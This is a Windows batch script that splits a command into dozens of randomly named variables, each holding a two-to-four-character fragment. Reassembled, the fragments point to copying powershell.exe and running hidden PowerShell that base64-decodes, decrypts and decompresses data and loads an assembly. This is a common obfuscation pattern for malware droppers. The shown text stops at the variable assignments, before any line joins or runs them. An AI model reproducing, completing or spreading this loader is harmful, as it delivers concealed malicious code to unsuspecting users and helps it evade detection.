@echo off
set "HWSegpMOIr=rs"
set "BoHPXKUXOi=he"
set "GXDClGmQxf=ll"
set "UOnwqtvOMQ=in"
set "AuTeiIkIjJ=\v"
set "AlOfYpCiuB=we"
set "owIJSNvDhg=ll"
set "czkpuYcenb=he"
set "HTPvrfmdDM=s\"
set "VdNpIrWhZj=:\"
set "UjGCeDincb=y "
set "HlGnChxbev=Sy"
set "FbfovEPBeJ=ow"
set "TysJlmcRdJ=Po"
set "kGgdhLjBvq=co"
set "HqLkKlPTBi=Wi"
set "FOGMkmtRgK=nd"
set "nyqWmsskkS=.e"
set "OknJzBcLwI=rS"
set "voPSALYkuf=em"
set "nyVsmloils= /"
set "lsLBaHRhhW=ws"
set "ZkIfwQGLyT=0\"
set "YebpDGlxPg=st"
set "gOwIKDSASL=\W"
set "HDQMaEbPFZ=py"
set "jmGZuIPHmj=do"
set "uGTplbbzLZ=xe"
set "vXnoXwfivh= C"
set "apoucuuSLn=32"
set "YFfVeUhwnc=we"
set "ploqiguCHo=po"
set "kqvviJYqYt=1."
set "AiOxlcnfrj=cd"
set "yFkaTBHWHJ= %~dp0"
set "NAhAVhrLiF=.Len"
set "YRGkHhDlJk=am;$"
set "YXIXFmQYRC=, (,"
set "HyHmRzjscR=HL.I"
set "beqqkaLPvL=KiO "
set "EDzJnLWwpX='txe"
set "XlMSvvXysE=bstr"
set "RqfOcLODXj=fPHL"
set "NTFdYUgwvF=iO.T"
set "RaiDfchIdJ=.Cry"
set "vPvvVyEmqI=ose("
set "xNeEFPYLmg=GmWA"
set "MsYokbFqJD=] -j"
set "ThbZXNdqFp=gMod"
set "mwieAPbGbe=.Cry"
set "SgYIBYkVrw=gU.T"
set "YhQCaLBrpi=ress"
set "EMDnGSXAdh== $n"
set "zJMxzdwDyA=n ''"
set "BseXuTOwGs=oL'["
set "ysjkoyjDWN=flec"
set "XBZBLpDGLH=2VUN"
set "vfwluCgGOB=tS46"
set "iDgTFecmSn= = $"
set "RhVnRWTqNG=QRhB"
set "ZDPijTyOlU=ypto"
set "fHnlemnbMq=.Key"
set "xLJspsocch=e]::"
set "KvLXRXgyoz=vert"
set "WxFohUbpoT=$Ycl"
set "KnGoLKhrwi=ne);"
set "HoBkAksqnM=Disp"
set "iUINxbfkcL=($Wc"
set "TOHFhTjaWN=oArr"
set "iXaVpLKwZd=join"
set "tXRIGxDmUA=y.Ci"
set "EgPAQuOUwa=qwNP"
set "bxPcpIBVgQ=L.Pa"
set "PCdOpijRNB=m.IO"
set "QwdrBHlGdB='gni"
set "khaNXBDDQT=tem."
set "syRhJDCXrB= [st"
set "CAeoWxNVvI=-nop"
set "JGvRpWXQzY=.Ass"
set "MtvolwTJjS=ment"
set "BeQHaXpghe=comp"
set "KHtQrywElg=ode]"
set "SesJDSkBQk=.Con"
set "VWQTsbdGMZ=in $"
set "DPoiJVkNte=th('"
set "ywiWWRAKaz=R5jf"
set "zSdZYBNMva=fPHL"
set "iAEYOoqIaR=.Dis"
set "NlXhczeeau=-joi"
